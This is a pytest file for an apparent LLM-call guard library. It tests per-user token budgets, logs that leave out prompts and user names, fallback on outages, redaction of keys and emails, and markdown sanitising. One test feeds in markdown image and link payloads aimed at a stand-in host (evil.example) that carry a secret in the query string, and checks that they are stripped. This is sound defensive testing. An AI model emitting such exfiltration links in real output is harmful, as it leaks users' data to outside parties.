from __future__ import annotations

import json
import logging
from typing import Any

import httpx
import pytest

from snipai.guard import BudgetExceeded, Guarded, redact, safe_markdown
from snipai.llm import Completion, FakeLLM

PAGE = "<text>snip is a URL shortener. It has an API.</text>"


class Down(FakeLLM):
    def complete(self, prompt: str, **kwargs: Any) -> Completion:
        raise httpx.ConnectError("connection refused")


class Broken(FakeLLM):
    def complete(self, prompt: str, **kwargs: Any) -> Completion:
        raise ValueError("our own bug")


def test_budget_is_per_user() -> None:
    g = Guarded(FakeLLM(), feature="t", prompt_version="v1", daily_tokens_per_user=10)
    g.user = "ada"
    g.complete(PAGE)
    with pytest.raises(BudgetExceeded):
        g.complete(PAGE)
    g.user = "grace"  # someone else still has their budget
    assert g.complete(PAGE).text


def test_one_log_line_per_call_without_the_prompt(caplog: pytest.LogCaptureFixture) -> None:
    g = Guarded(FakeLLM(), feature="describe", prompt_version="v3")
    g.user = "ada@example.com"
    with caplog.at_level(logging.INFO, logger="snipai.calls"):
        g.complete(PAGE)
    (record,) = caplog.records
    line = json.loads(record.getMessage())
    assert line["feature"] == "describe" and line["prompt_version"] == "v3"
    assert line["input_tokens"] > 0 and line["fell_back"] is False
    assert "shortener" not in record.getMessage()  # no prompt or answer text
    assert "ada" not in record.getMessage()  # the user is a pseudonym


def test_outages_fall_back_but_bugs_do_not(caplog: pytest.LogCaptureFixture) -> None:
    g = Guarded(Down(), feature="t", prompt_version="v1", fallback=FakeLLM())
    with caplog.at_level(logging.INFO, logger="snipai.calls"):
        assert g.complete(PAGE).text == "snip is a URL shortener."
    assert json.loads(caplog.records[0].getMessage())["fell_back"] is True
    with pytest.raises(ValueError):
        Guarded(Broken(), feature="t", prompt_version="v1", fallback=FakeLLM()).complete(PAGE)
    with pytest.raises(httpx.ConnectError):
        Guarded(Down(), feature="t", prompt_version="v1").complete(PAGE)


def test_safe_markdown_blocks_exfiltration() -> None:
    out = safe_markdown(
        "Done ![x](https://evil.example/p.png?d=secret) see [docs](https://docs.example.com/a) "
        "and [this](https://evil.example/?d=secret)",
        allowed_hosts={"docs.example.com"},
    )
    assert "evil.example" not in out and "secret" not in out
    assert "[docs](https://docs.example.com/a)" in out and "and this" in out


def test_redact() -> None:
    text = redact("key sk-ant-api03-abcdefghijk and snip_0123456789ab for bob@example.org")
    assert text == "key [key] and [key] for [email]"
